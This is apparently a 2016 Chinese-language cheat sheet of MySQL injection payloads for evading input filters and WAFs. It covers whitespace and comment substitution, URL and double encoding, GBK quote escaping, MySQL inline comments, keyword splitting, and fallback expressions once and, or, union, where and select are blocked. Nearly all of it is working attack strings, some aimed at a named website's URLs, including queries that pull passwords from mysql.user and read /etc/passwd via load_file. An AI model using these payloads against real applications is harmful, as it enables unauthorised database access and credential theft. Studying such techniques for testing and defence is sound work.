---
title: "Mysql注入过滤"
date: 2016-04-25 21:09
---


## 过滤识别

### 查找关键字

```
and 1=1
and =
and 1
and (select 1)
and union
and union select
and union select 1,2,
and union/**/select/**/1,2
and select
?id=2078-1
?id=2078-if(1,0,1)
?id=2077-mid(123,1,1)
```

### 识别关键词边界

```
where id=8E0union select 1,2,3,4,5,6,7,8,9,0
where id=8.0union select 1,2,3,4,5,6,7,8,9,0
where id=\Nunion select 1,2,3,4,5,6,7,8,9,0
where id=.1union/*.1*/select-.1
where id=.1union/*.1*/select!.1
where id=.1union/*.1*/select~.1
where id=.1union/*.1*/select(1)
where id=.1union/*.1*/select`host`from mysql.user
where id=.1union/*.1*/select'1'
where id=.1union/*.1*/select"1"
where id=.1union/*.1*/select@1
```

## 特殊符号绕过

### 过滤空格

在MySQL中可替换为：

```
# 反引号
SQL> select * from`user`;

# 括号
SQL> 'and(true)like(false)union(select(pass)from(users))#

# +

# /**/
```

空格可以使用如下替代：

> 在php中 \s 会匹配0x09,0x0a,0x0b,0x0c,0x0d,0x20

```
09：Horizontal Tab
0A：New Line
0B：Vertical Tab
0C：New Page
0D：Carriage Return
A0：Non-breaking Space
20：Space
a0：空格
2B：+
2D：-
7E：~
21：!
40：@
```

空格替换为：#Xburne%0a

在特定数据库中可以使用以下替代：

```
SQLite3：0A 0D 0C 09 20
MySQL5 09：0A 0B 0C 0D A0 20
PosgresSQL：0A 0D 0C 09 20
Oracle 11g：00 0A 0D 0C 09 20
MSSQL：01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
```

示例：

```
SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))
' or --+2=- -!!!'2
```

### 过滤逗号

使用语法绕过：

```
SQL> UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c);
实际上也就相当于：
SQL> UNION SELECT 1,2,3;
```

### 过滤 = ( '

```
过滤：1 union select 1, table_name from information_schema.tables where table_name = 'users'
过滤：1 union select 1, table_name from information_schema.tables where table_name between 'a' and 'z'
过滤：1 union select 1, table_name from information_schema.tables where table_name between char(97) and char(122)

绕过：1 union select 1, table_name from information_schema.tables where table_name between 0x61 and 0x7a
绕过：1 union select 1, table_name from information_schema.tables where table_name like 0x7573657273
```

### 单双引号

```
GBK编码 %df'
UNICODE编码 %2527
```

单引号逃逸：

* \

```
# 用户名为username
SQL> select * from db where name='username\' and passwd=' or 1=1#
```

### 过滤 //

```
过滤：http://www.90jishuwang.com/main/news/id/1/X362X*/||/**/lpad(first_name,7,1).html
绕过：http://www.90jishuwang.com/main/news/id/1%0b||%0blpad(first_name,7,1).html
```

## 注释和编码绕过

### 注释符

```
# %23
-- 后面要加空格
/**/ 只加前半个也行
;%00 Nullbyte
` Backtick
```

```
SQL> 1+un/**/ion+se/**/lect+1,2,3 -- 空格
```

### 巧用注释和编码：

```
绕过：http://www.90jishuwang.com/news.php?id=0+div+1+union%23fooX381X%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
解析：
0 div 1 union#foo*/*/bar
select#foo
1,2,current_user
```

MySQL Inline Comments：

```
/*!12345select*//*!12345user*/ from mysql.user;
绕过：http://www.90jishuwang.com/news.php?id=1/*!12345!UnIoN*/SeLecT+1,2,3 --
```

### 双编码

多次解析：
%2527解析后是%27再解析是'

```
绕过：http://www.90jishuwang.com/news.php?id=1%252f%252aX396X/union%252f%252a /select%252f%252a*/1,2,3%252f%252a*/from%252f%252a*/users --
```

### 编码组合

```
过滤：http://www.90jishuwang.com/php-nuke/?/X401X*/union/**/select?
绕过：http://www.90jishuwang.com/php-nuke/?/%2A%2A/union/%2A%2A/select?
绕过：http://www.90jishuwang.com/php-nuke/?%2fX405X*%2funion%2f**%2fselect?
```

### 中文字符绕过

```
SQL> union/*%aa*/select
```

利用 union/*中文字符*/select，还要保证这种中文字符不能构造一个汉字。

### 进制换算

```
' or 'a' = n'a # unicode
' %u0061nd 1 = 1 # unicode
' or 'a' = b'1100001 # binary
' or 'a' = x'61 # hexadecimal
' and substr(data,1,1) = 0x61# 0x6162
' and substr(data,1,1) = unhex(61)# unhex(6162)
' and substr(data,1,1) = char(97)# char(97,98)
' and substr(data,1,1) = lower(conv(10,10,36))# 'a'
' and substr(data,1,1) = lower(conv(11,10,36))# 'b'
' and substr(data,1,1) = lower(conv(36,10,36))# 'z'
```

## 语法绕过

### 关键词绕过

* 过滤and，or可以使用&&和||

```
过滤：1 or 1 = 1 1 and 1 = 1
绕过：1 || 1 = 1 1 && a = 1
绕过：^, =, !=, %, /, *, &, &&, |, ||, <, >, >>, <<, >=, <=, <>, <=>, XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN, ...
```

* 同时过滤and，or，union

```
过滤：union select user, passwd from users
绕过：1 || (select user from users where user_id = 1) = 'admin'
```

* 同时过滤and，or，union，where

```
过滤：1 || (select user from users where user_id = 1) = 'admin'
绕过：1 || (select user from users limit 1) = 'admin'
```

* 同时过滤and，or，union，where，limit

```
过滤：1 || (select user from users limit 1) = 'admin'
绕过：1 || (select user from users group by user_id having user_id = 1) = 'admin'
```

* 同时过滤and，or，union，where，limit，group by

```
过滤：1 || (select user from users group by user_id having user_id = 1) = 'admin'
绕过：1 || (select substr(group_concat(user),1,5) from users) = 'admin'
```

* 同时过滤and，or，union，where，limit，group by，select

```
过滤：1 || (select substr(group_concat(user),1,5) from users) = 'admin'
绕过：1 || 1 = 1 into outfile 'result.txt'
绕过：1 || substr(user,1,5) = 'admin'
绕过：1 || user_id is not null
绕过：1 || substr(user,1,1) = 0x61
绕过：1 || substr(user,1,1) = unhex(61)
绕过：1 || substr(user,1,1) = lower(conv(11,10,36))
```

* 同时绕过and，or，union，where，limit，group by，select，hex，substr

```
过滤：1 || substr(user,1,1) = lower(conv(11,10,36))
绕过：1 || lpad(user,7,1)
```

### 移除关键词

```
绕过：1+UNunionION+SEselectLECT+1,2,3 --
绕过：1+uni%0bon+se%0blect+1,2,3 --
```

### 敏感函数

```
version()%0b


将version()换成@@version


`函数名`() 等价于 函数名()
SQL> id=1 and(select `load_file`(0x2f6574632f706173737764) is not null)

SQL> id=1614444.0Union(select-1.0,password,3,4,5,6,7,`user`FROM(`mysql`.user))
这里关键是反单引号的使用,成功逃过了敏感字符串“mysql.user”。
id=161444.0有两个作用,第一让原来的查询返回空，第二这是一个小数，小数后可以直接接关键字，而不用空格。
```

### 语句变形 --mysql黑魔法

```
SQL> select{x table_name}from{x information_schema.tables}
```

### 大小写

SQL> 1+UnIoN/**/SeLecT/**/1,2,3 --

## 中间层绕过

### php.ini设置

safe_mode = On <- 比较用户权限，限制特定函数
display_errors = Off

magic_quotes_gpc = On <- 转义特殊符号
and+column_name+like+%2527%25pass%25%2527 双重转义

magic_quotes_gpc = Off
username=char(97,108,112)%23 <- 不包含引号 username=0x616C7069 select 'a' -> select version() <- 不包含引号